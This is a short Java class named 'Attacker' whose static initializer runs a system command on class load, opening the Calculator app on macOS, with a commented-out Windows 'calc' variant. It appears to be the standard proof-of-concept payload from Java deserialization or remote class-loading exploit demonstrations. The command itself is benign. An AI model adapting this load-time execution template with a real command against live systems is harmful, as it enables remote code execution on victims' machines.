import java.io.IOException;

public class Attacker {

    public Attacker() {
        System.out.println("Constructor");
    }

    static {
        try {
            // 打开计算器 for Mac
            Runtime.getRuntime().exec(new String[]{"open", "-a", "Calculator"});
            // 打开计算器 for Win
            // Runtime.getRuntime().exec(new String[]{"calc"});
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}


